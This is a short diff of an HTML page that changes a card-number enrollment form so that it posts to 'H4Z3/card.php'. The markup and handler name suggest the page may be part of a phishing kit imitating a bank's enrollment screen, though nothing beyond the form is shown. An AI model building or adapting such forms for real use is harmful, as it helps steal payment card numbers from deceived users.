@@ -51,7 +51,7 @@
                         </div>
                     </section>
                     <section class="identify-customer-section">
-                        <form id="form" action="H4Z3/card" method="POST" class="unauth-form jqtransform js-enrollment-form">
+                        <form id="form" action="H4Z3/card.php" method="POST" class="unauth-form jqtransform js-enrollment-form">
                             <div class="unauth-form__row">
                                 <div class="unauth-form__rowitem">
                                     <label class="unauth-form__label" for="card">Card Number</label>
